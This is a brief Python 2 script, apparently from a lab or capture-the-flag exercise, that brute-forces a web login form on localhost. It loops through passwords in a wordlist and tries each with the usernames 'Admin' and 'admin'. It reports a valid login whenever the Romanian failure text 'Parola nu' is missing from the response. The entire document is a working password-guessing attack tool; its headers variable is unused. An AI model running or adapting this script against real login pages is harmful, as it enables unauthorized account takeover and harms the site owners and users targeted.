import requests

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
url = "http://127.0.0.1:80/"

password_list = open("wordlist.txt", "r")
for line in password_list:
	password = line.strip()
	users = ["Admin", "admin"]
	for user in users:
		r = requests.post(url, data={"input1": user, "input2": password, "sub": "Submit+Query"})
		content = r.content
		if "Parola nu" in content:
			print "[ + ] Invalid: " + user, password
		else:
			print "[ + ] Valid: " + user, password
			break
